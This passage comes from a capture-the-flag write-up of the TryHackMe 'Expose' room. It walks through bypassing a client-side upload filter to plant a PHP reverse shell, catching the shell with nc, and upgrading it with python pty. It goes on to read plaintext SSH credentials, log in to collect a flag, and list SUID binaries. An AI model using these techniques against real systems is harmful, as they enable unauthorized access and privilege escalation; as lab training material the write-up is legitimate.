+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=k>function</span> validate<span class=o>(){</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> var <span class=nv>fileInput</span> <span class=o>=</span> document.getElementById<span class=o>(</span><span class=s1>&#39;file&#39;</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  var <span class=nv>file</span> <span class=o>=</span> fileInput.files<span class=o>[</span>0<span class=o>]</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=o>(</span>file<span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>    var <span class=nv>fileName</span> <span class=o>=</span> file.name<span class=p>;</span>
+</span></span><span class=line><span class=cl>    var <span class=nv>fileExtension</span> <span class=o>=</span> fileName.split<span class=o>(</span><span class=s1>&#39;.&#39;</span><span class=o>)</span>.pop<span class=o>()</span>.toLowerCase<span class=o>()</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=nv>fileExtension</span> <span class=o>===</span> <span class=s1>&#39;jpg&#39;</span> <span class=o>||</span> <span class=nv>fileExtension</span> <span class=o>===</span> <span class=s1>&#39;png&#39;</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>      // Valid file extension, proceed with file upload
+</span></span><span class=line><span class=cl>      // You can submit the form or perform further processing here
+</span></span><span class=line><span class=cl>      console.log<span class=o>(</span><span class=s1>&#39;File uploaded successfully&#39;</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	  <span class=k>return</span> true<span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>      // Invalid file extension, display an error message or take appropriate action
+</span></span><span class=line><span class=cl>      console.log<span class=o>(</span><span class=s1>&#39;Only JPG and PNG files are allowed&#39;</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	  <span class=k>return</span> false<span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>But now we know that it’s a client restriction, so it’s easy to bypass:</p><p>We can just rename the shell rev.png, upload it and intercept the request:</p><p>and then we just change the name to rev.php again</p><p><img src=https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%207.png loading=lazy alt=Untitled></p><p>And we can see that it worked:</p><p><img src=https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%208.png loading=lazy alt=Untitled></p><p>Before opening the file I started a listener using nc</p><p>And we are now in the machine with the www-data account:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lvnp <span class=m>4444</span>
+</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>4444</span> ...
+</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.11.65.91<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.229.207<span class=o>]</span> <span class=m>56016</span>
+</span></span><span class=line><span class=cl>Linux ip-10-10-229-207 5.15.0-1039-aws <span class=c1>#44~20.04.1-Ubuntu SMP Thu Jun 22 12:21:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span class=line><span class=cl> 14:43:16 up  1:46,  <span class=m>0</span> users,  load average: 0.01, 0.01, 0.00
+</span></span><span class=line><span class=cl>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
+</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>782<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
+</span></span><span class=line><span class=cl>bash: no job control in this shell
+</span></span><span class=line><span class=cl>www-data@ip-10-10-229-207:/$
+</span></span></code></pre></td></tr></table></div></div><p>We also have python so I am going to upgrade my shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>And after entering the zeamkish folder I noticed that he has the credentials for the ssh in plaintext:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ls -la
+</span></span><span class=line><span class=cl>total <span class=m>36</span>
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> zeamkish zeamkish <span class=m>4096</span> Jul  <span class=m>6</span>  <span class=m>2023</span> .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>4</span> root     root     <span class=m>4096</span> Jun <span class=m>30</span>  <span class=m>2023</span> ..
+</span></span><span class=line><span class=cl>-rw-rw-r-- <span class=m>1</span> zeamkish zeamkish    <span class=m>5</span> Jul  <span class=m>6</span>  <span class=m>2023</span> .bash_history
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> zeamkish zeamkish  <span class=m>220</span> Jun  <span class=m>8</span>  <span class=m>2023</span> .bash_logout
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> zeamkish zeamkish <span class=m>3771</span> Jun  <span class=m>8</span>  <span class=m>2023</span> .bashrc
+</span></span><span class=line><span class=cl>drwx------ <span class=m>2</span> zeamkish zeamkish <span class=m>4096</span> Jun  <span class=m>8</span>  <span class=m>2023</span> .cache
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> zeamkish zeamkish  <span class=m>807</span> Jun  <span class=m>8</span>  <span class=m>2023</span> .profile
+</span></span><span class=line><span class=cl>-rw-r----- <span class=m>1</span> zeamkish zeamkish   <span class=m>27</span> Jun  <span class=m>8</span>  <span class=m>2023</span> flag.txt
+</span></span><span class=line><span class=cl>-rw-rw-r-- <span class=m>1</span> root     zeamkish   <span class=m>34</span> Jun <span class=m>11</span>  <span class=m>2023</span> ssh_creds.txt
+</span></span><span class=line><span class=cl>$ cat ssh_creds.txt
+</span></span><span class=line><span class=cl>cat ssh_creds.txt
+</span></span><span class=line><span class=cl>SSH CREDS
+</span></span><span class=line><span class=cl>zeamkish
+</span></span><span class=line><span class=cl>&lt;redacted&gt;
+</span></span></code></pre></td></tr></table></div></div><p>So now we are in as zeamkish and we can read the flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh zeamkish@10.10.229.207
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>zeamkish@10.10.229.207<span class=err>&#39;</span>s password:
+</span></span><span class=line><span class=cl>Welcome to Ubuntu 20.04.6 LTS <span class=o>(</span>GNU/Linux 5.15.0-1039-aws x86_64<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
+</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
+</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  System information as of Sun Jan <span class=m>28</span> 14:48:35 UTC <span class=m>2024</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  System load:  0.0               Processes:             <span class=m>130</span>
+</span></span><span class=line><span class=cl>  Usage of /:   7.5% of 58.09GB   Users logged in:       <span class=m>0</span>
+</span></span><span class=line><span class=cl>  Memory usage: 21%               IPv4 address <span class=k>for</span> eth0: 10.10.229.207
+</span></span><span class=line><span class=cl>  Swap usage:   0%
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> * Ubuntu Pro delivers the most comprehensive open <span class=nb>source</span> security and
+</span></span><span class=line><span class=cl>   compliance features.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   https://ubuntu.com/aws/pro
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Expanded Security Maintenance <span class=k>for</span> Applications is not enabled.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=m>0</span> updates can be applied immediately.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Enable ESM Apps to receive additional future security updates.
+</span></span><span class=line><span class=cl>See https://ubuntu.com/esm or run: sudo pro status
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>The list of available updates is more than a week old.
+</span></span><span class=line><span class=cl>To check <span class=k>for</span> new updates run: sudo apt update
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Last login: Sun Jul  <span class=m>2</span> 17:27:46 <span class=m>2023</span> from 10.10.83.109
+</span></span><span class=line><span class=cl>zeamkish@ip-10-10-229-207:~$ whoami
+</span></span><span class=line><span class=cl>zeamkish
+</span></span><span class=line><span class=cl>zeamkish@ip-10-10-229-207:~$ ls
+</span></span><span class=line><span class=cl>flag.txt  ssh_creds.txt
+</span></span><span class=line><span class=cl>zeamkish@ip-10-10-229-207:~$ cat flag.txt
+</span></span><span class=line><span class=cl>THM<span class=o>{</span>&lt;redacted&gt;<span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>After some enumeration I found a SUID set:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
+</span><span class=lnt>90
+</span><span class=lnt>91
+</span><span class=lnt>92
+</span><span class=lnt>93
+</span><span class=lnt>94
+</span><span class=lnt>95
+</span><span class=lnt>96
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>zeamkish@ip-10-10-229-207:/home/ubuntu/sqlmap$ find / -type f -perm -04000 -ls 2&gt;/dev/null
+</span></span><span class=line><span class=cl>      <span class=m>847</span>     <span class=m>84</span> -rwsr-xr-x   <span class=m>1</span> root     root        <span class=m>85064</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core20/1974/usr/bin/chfn
+</span></span><span class=line><span class=cl>      <span class=m>853</span>     <span class=m>52</span> -rwsr-xr-x   <span class=m>1</span> root     root        <span class=m>53040</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core20/1974/usr/bin/chsh
+</span></span><span class=line><span class=cl>      <span class=m>922</span>     <span class=m>87</span> -rwsr-xr-x   <span class=m>1</span> root     root        <span class=m>88464</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core20/1974/usr/bin/gpasswd
+</span></span><span class=line><span class=cl>     <span class=m>1006</span>     <span class=m>55</span> -rwsr-xr-x   <span class=m>1</span> root     root        <span class=m>55528</span> May <span class=m>30</span>  <span class=m>2023</span> /snap/core20/1974/usr/bin/mount
+</span></span><span class=line><span class=cl>     <span class=m>1015</span>     <span class=m>44</span> -rwsr-xr-x   <span class=m>1</span> root     root        <span class=m>44784</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core20/1974/usr/bin/newgrp
+</span></span><span class=line><span class=cl>     <span class=m>1030</span>     <span class=m>67</span> -rwsr-xr-x   <span class=m>1</span> root     root        <span class=m>68208</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core20/1974/usr/bin/passwd
+</span></span><span class=line><span class=cl>     <span class=m>1140</span>     <span class=m>67</span> -rwsr-xr-x   <span class=m>1</span> root     root        <span class=m>67816</span> May <span class=m>30</span>  <span class=m>2023</span> /snap/core20/1974/usr/bin/su
+</span></span><span class=line><span class=cl>     <span class=m>1141</span>    <span class=m>163</span> -rwsr-xr-x   <span class=m>1</span> root     root       <span class=m>166056</span> Apr  <span class=m>4</span>  <span class=m>2023</span> /snap/core20/1974/usr/bin/sudo
+</span></span><span class=line><span class=cl>     <span class=m>1199</span>     <span class=m>39</span> -rwsr-xr-x   <span class=m>1</span> root     root        <span class=m>39144</span> May <span class=m>30</span>  <span class=m>2023</span> /snap/core20/1974/usr/bin/umount
+</span></span><span class=line><span class=cl>     <span class=m>1288</span>     <span class=m>51</span> -rwsr-xr--   <span class=m>1</span> root     systemd-resolve    <span class=m>51344</span> Oct <span class=m>25</span>  <span class=m>2022</span> /snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class=line><span class=cl>     <span class=m>1660</span>    <span class=m>463</span> -rwsr-xr-x   <span class=m>1</span> root     root              <span class=m>473576</span> Apr  <span class=m>3</span>  <span class=m>2023</span> /snap/core20/1974/usr/lib/openssh/ssh-keysign
+</span></span><span class=line><span class=cl>      <span class=m>847</span>     <span class=m>84</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>85064</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core20/1950/usr/bin/chfn
+</span></span><span class=line><span class=cl>      <span class=m>853</span>     <span class=m>52</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>53040</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core20/1950/usr/bin/chsh
+</span></span><span class=line><span class=cl>      <span class=m>922</span>     <span class=m>87</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>88464</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core20/1950/usr/bin/gpasswd
+</span></span><span class=line><span class=cl>     <span class=m>1006</span>     <span class=m>55</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>55528</span> May <span class=m>30</span>  <span class=m>2023</span> /snap/core20/1950/usr/bin/mount
+</span></span><span class=line><span class=cl>     <span class=m>1015</span>     <span class=m>44</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>44784</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core20/1950/usr/bin/newgrp
+</span></span><span class=line><span class=cl>     <span class=m>1030</span>     <span class=m>67</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>68208</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core20/1950/usr/bin/passwd
+</span></span><span class=line><span class=cl>     <span class=m>1140</span>     <span class=m>67</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>67816</span> May <span class=m>30</span>  <span class=m>2023</span> /snap/core20/1950/usr/bin/su
+</span></span><span class=line><span class=cl>     <span class=m>1141</span>    <span class=m>163</span> -rwsr-xr-x   <span class=m>1</span> root     root              <span class=m>166056</span> Apr  <span class=m>4</span>  <span class=m>2023</span> /snap/core20/1950/usr/bin/sudo
+</span></span><span class=line><span class=cl>     <span class=m>1199</span>     <span class=m>39</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>39144</span> May <span class=m>30</span>  <span class=m>2023</span> /snap/core20/1950/usr/bin/umount
+</span></span><span class=line><span class=cl>     <span class=m>1288</span>     <span class=m>51</span> -rwsr-xr--   <span class=m>1</span> root     systemd-resolve    <span class=m>51344</span> Oct <span class=m>25</span>  <span class=m>2022</span> /snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class=line><span class=cl>     <span class=m>1660</span>    <span class=m>463</span> -rwsr-xr-x   <span class=m>1</span> root     root              <span class=m>473576</span> Apr  <span class=m>3</span>  <span class=m>2023</span> /snap/core20/1950/usr/lib/openssh/ssh-keysign
+</span></span><span class=line><span class=cl>       <span class=m>66</span>     <span class=m>40</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>40152</span> Jun <span class=m>14</span>  <span class=m>2022</span> /snap/core/15511/bin/mount
+</span></span><span class=line><span class=cl>       <span class=m>80</span>     <span class=m>44</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>44168</span> May  <span class=m>7</span>  <span class=m>2014</span> /snap/core/15511/bin/ping
+</span></span><span class=line><span class=cl>       <span class=m>81</span>     <span class=m>44</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>44680</span> May  <span class=m>7</span>  <span class=m>2014</span> /snap/core/15511/bin/ping6
+</span></span><span class=line><span class=cl>       <span class=m>98</span>     <span class=m>40</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>40128</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core/15511/bin/su
+</span></span><span class=line><span class=cl>      <span class=m>116</span>     <span class=m>27</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>27608</span> Jun <span class=m>14</span>  <span class=m>2022</span> /snap/core/15511/bin/umount
+</span></span><span class=line><span class=cl>     <span class=m>2646</span>     <span class=m>71</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>71824</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core/15511/usr/bin/chfn
+</span></span><span class=line><span class=cl>     <span class=m>2648</span>     <span class=m>40</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>40432</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core/15511/usr/bin/chsh
+</span></span><span class=line><span class=cl>     <span class=m>2725</span>     <span class=m>74</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>75304</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core/15511/usr/bin/gpasswd
+</span></span><span class=line><span class=cl>     <span class=m>2817</span>     <span class=m>39</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>39904</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core/15511/usr/bin/newgrp
+</span></span><span class=line><span class=cl>     <span class=m>2830</span>     <span class=m>53</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>54256</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core/15511/usr/bin/passwd
+</span></span><span class=line><span class=cl>     <span class=m>2940</span>    <span class=m>134</span> -rwsr-xr-x   <span class=m>1</span> root     root              <span class=m>136808</span> Jan <span class=m>17</span>  <span class=m>2023</span> /snap/core/15511/usr/bin/sudo
+</span></span><span class=line><span class=cl>     <span class=m>3039</span>     <span class=m>42</span> -rwsr-xr--   <span class=m>1</span> root     systemd-resolve    <span class=m>42992</span> Oct <span class=m>26</span>  <span class=m>2022</span> /snap/core/15511/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class=line><span class=cl>     <span class=m>3411</span>    <span class=m>419</span> -rwsr-xr-x   <span class=m>1</span> root     root              <span class=m>428240</span> Oct  <span class=m>7</span>  <span class=m>2022</span> /snap/core/15511/usr/lib/openssh/ssh-keysign
+</span></span><span class=line><span class=cl>     <span class=m>6485</span>    <span class=m>125</span> -rwsr-xr-x   <span class=m>1</span> root     root              <span class=m>127656</span> May <span class=m>27</span>  <span class=m>2023</span> /snap/core/15511/usr/lib/snapd/snap-confine
+</span></span><span class=line><span class=cl>     <span class=m>7673</span>    <span class=m>386</span> -rwsr-xr--   <span class=m>1</span> root     dip               <span class=m>394984</span> Jul <span class=m>23</span>  <span class=m>2020</span> /snap/core/15511/usr/sbin/pppd
+</span></span><span class=line><span class=cl>       <span class=m>66</span>     <span class=m>40</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>40152</span> Jun <span class=m>14</span>  <span class=m>2022</span> /snap/core/15419/bin/mount
+</span></span><span class=line><span class=cl>       <span class=m>80</span>     <span class=m>44</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>44168</span> May  <span class=m>7</span>  <span class=m>2014</span> /snap/core/15419/bin/ping
+</span></span><span class=line><span class=cl>       <span class=m>81</span>     <span class=m>44</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>44680</span> May  <span class=m>7</span>  <span class=m>2014</span> /snap/core/15419/bin/ping6
+</span></span><span class=line><span class=cl>       <span class=m>98</span>     <span class=m>40</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>40128</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core/15419/bin/su
+</span></span><span class=line><span class=cl>      <span class=m>116</span>     <span class=m>27</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>27608</span> Jun <span class=m>14</span>  <span class=m>2022</span> /snap/core/15419/bin/umount
+</span></span><span class=line><span class=cl>     <span class=m>2607</span>     <span class=m>71</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>71824</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core/15419/usr/bin/chfn
+</span></span><span class=line><span class=cl>     <span class=m>2609</span>     <span class=m>40</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>40432</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core/15419/usr/bin/chsh
+</span></span><span class=line><span class=cl>     <span class=m>2686</span>     <span class=m>74</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>75304</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core/15419/usr/bin/gpasswd
+</span></span><span class=line><span class=cl>     <span class=m>2778</span>     <span class=m>39</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>39904</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core/15419/usr/bin/newgrp
+</span></span><span class=line><span class=cl>     <span class=m>2791</span>     <span class=m>53</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>54256</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core/15419/usr/bin/passwd
+</span></span><span class=line><span class=cl>     <span class=m>2901</span>    <span class=m>134</span> -rwsr-xr-x   <span class=m>1</span> root     root              <span class=m>136808</span> Jan <span class=m>17</span>  <span class=m>2023</span> /snap/core/15419/usr/bin/sudo
+</span></span><span class=line><span class=cl>     <span class=m>3000</span>     <span class=m>42</span> -rwsr-xr--   <span class=m>1</span> root     systemd-resolve    <span class=m>42992</span> Oct <span class=m>26</span>  <span class=m>2022</span> /snap/core/15419/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class=line><span class=cl>     <span class=m>3372</span>    <span class=m>419</span> -rwsr-xr-x   <span class=m>1</span> root     root              <span class=m>428240</span> Oct  <span class=m>7</span>  <span class=m>2022</span> /snap/core/15419/usr/lib/openssh/ssh-keysign
+</span></span><span class=line><span class=cl>     <span class=m>6446</span>    <span class=m>125</span> -rwsr-xr-x   <span class=m>1</span> root     root              <span class=m>127656</span> May <span class=m>12</span>  <span class=m>2023</span> /snap/core/15419/usr/lib/snapd/snap-confine
+</span></span><span class=line><span class=cl>     <span class=m>7634</span>    <span class=m>386</span> -rwsr-xr--   <span class=m>1</span> root     dip               <span class=m>394984</span> Jul <span class=m>23</span>  <span class=m>2020</span> /snap/core/15419/usr/sbin/pppd
+</span></span><span class=line><span class=cl>       <span class=m>56</span>     <span class=m>43</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>43088</span> Sep <span class=m>16</span>  <span class=m>2020</span> /snap/core18/2785/bin/mount
+</span></span><span class=line><span class=cl>       <span class=m>65</span>     <span class=m>63</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>64424</span> Jun <span class=m>28</span>  <span class=m>2019</span> /snap/core18/2785/bin/ping
+</span></span><span class=line><span class=cl>       <span class=m>81</span>     <span class=m>44</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>44664</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core18/2785/bin/su
+</span></span><span class=line><span class=cl>       <span class=m>99</span>     <span class=m>27</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>26696</span> Sep <span class=m>16</span>  <span class=m>2020</span> /snap/core18/2785/bin/umount
+</span></span><span class=line><span class=cl>     <span class=m>1754</span>     <span class=m>75</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>76496</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core18/2785/usr/bin/chfn
+</span></span><span class=line><span class=cl>     <span class=m>1756</span>     <span class=m>44</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>44528</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core18/2785/usr/bin/chsh
+</span></span><span class=line><span class=cl>     <span class=m>1809</span>     <span class=m>75</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>75824</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core18/2785/usr/bin/gpasswd
+</span></span><span class=line><span class=cl>     <span class=m>1873</span>     <span class=m>40</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>40344</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core18/2785/usr/bin/newgrp
